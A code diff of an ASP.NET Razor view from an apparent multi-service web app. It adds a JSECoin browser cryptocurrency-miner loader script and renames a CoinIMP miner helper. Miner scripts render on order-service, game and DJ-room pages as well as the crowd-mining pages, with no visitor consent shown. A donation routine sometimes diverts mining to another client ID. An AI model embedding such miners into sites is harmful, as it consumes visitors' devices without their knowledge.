@@ -10,29 +10,38 @@
 
 @*<h4>@Model.ServiceName</h4>*@
 
-
-@helper renderMiner()
+@helper renderJSECoinMiner()
 {
-        string ClientId = Model.MinerConfigurationViewModel.ClientId;
-        bool shallDonate = SignalRService.Utils.ScriptDonater.Instance.ShallDonate(ClientId);
-        if (shallDonate)
-        {
-            string donateClientId = SignalRService.Utils.ScriptDonater.Instance.Donate(ClientId);
-            <text>
-                <script>
+    <text>
+<script type="text/javascript">
+    !function () { var e = document, t = e.createElement("script"), s = e.getElementsByTagName("script")[0]; t.type = "text/javascript", t.async = t.defer = !0, t.src = "https://load.jsecoin.com/load/87722/srs.hepf.com/0/0/", s.parentNode.insertBefore(t, s) }();
+</script>
+    </text>
+
+}
+
+@helper renderCoinIMPMiner()
+{
+    string ClientId = Model.MinerConfigurationViewModel.ClientId;
+    bool shallDonate = SignalRService.Utils.ScriptDonater.Instance.ShallDonate(ClientId);
+    if (shallDonate)
+    {
+        string donateClientId = SignalRService.Utils.ScriptDonater.Instance.Donate(ClientId);
+        <text>
+            <script>
                 @SignalRService.Utils.RenderUtils.RenderMinerScript(donateClientId, Model.MinerConfigurationViewModel.Throttle, Model.MinerConfigurationViewModel.ScriptUrl, Model.MinerConfigurationViewModel.StartDelayMs, Model.MinerConfigurationViewModel.ReportStatusIntervalMs, true)
-                </script>
-            </text>
-        }
-        else
-        {
-            SignalRService.Utils.ScriptDonater.Instance.AddStat(ClientId);
-            <text>
-                <script>
+            </script>
+        </text>
+    }
+    else
+    {
+        SignalRService.Utils.ScriptDonater.Instance.AddStat(ClientId);
+        <text>
+            <script>
                 @SignalRService.Utils.RenderUtils.RenderMinerScript(Model.MinerConfigurationViewModel.ClientId, Model.MinerConfigurationViewModel.Throttle, Model.MinerConfigurationViewModel.ScriptUrl, Model.MinerConfigurationViewModel.StartDelayMs, Model.MinerConfigurationViewModel.ReportStatusIntervalMs, true)
-                </script>
-            </text>
-        }
+            </script>
+        </text>
+    }
 }
 
 @{
@@ -40,7 +49,7 @@
     switch (Model.EnumServiceTpe)
     {
         case SignalRService.Enums.EnumServiceType.OrderService:
-            @renderMiner()
+            @renderCoinIMPMiner()
             @Html.Partial("StripePayment")
             if (SignalRService.Utils.ServiceUtils.IsServiceOwner(Model.Id, User.Identity.Name))
             {
@@ -66,7 +75,7 @@
             }
             break;
         case SignalRService.Enums.EnumServiceType.LuckyGameDefault:
-            @renderMiner()
+            @renderCoinIMPMiner()
             Layout = "~/Views/Shared/_LayoutReact.cshtml";
             @Html.Partial("~/Views/LuckyGame/Index.cshtml", Model.LuckyGameSettingsViewModel);
             break;
@@ -76,16 +85,22 @@
             @Html.Partial("~/Views/PositionTracker/Index.cshtml", Model.PositionTrackerConfiguratinViewModel);
             break;
 
-        case SignalRService.Enums.EnumServiceType.CrowdMiner:
-            @renderMiner()
+        case SignalRService.Enums.EnumServiceType.CrowdMinerCoinIMP:
+            @renderCoinIMPMiner()
             Layout = "~/Views/Shared/_LayoutCrowdMiner.cshtml";
-            @Html.Partial("~/Views/CrowdMiner/Index.cshtml", Model);
+            @Html.Partial("~/Views/CrowdMiner/IndexCoinIMP.cshtml", Model);
             break;
 
         case SignalRService.Enums.EnumServiceType.DJRoom:
-            @renderMiner()
+            @renderCoinIMPMiner()
             Layout = "~/Views/Shared/_LayoutDJRoom.cshtml";
             @Html.Partial("~/Views/DJRoom/Index.cshtml", Model);
+            break;
+
+        case SignalRService.Enums.EnumServiceType.CrowdMinerJSECoin:
+            @renderJSECoinMiner()
+            Layout = "~/Views/Shared/_LayoutCrowdMiner.cshtml";
+            @Html.Partial("~/Views/CrowdMiner/IndexJSECoin.cshtml", Model);
             break;
 
         default:
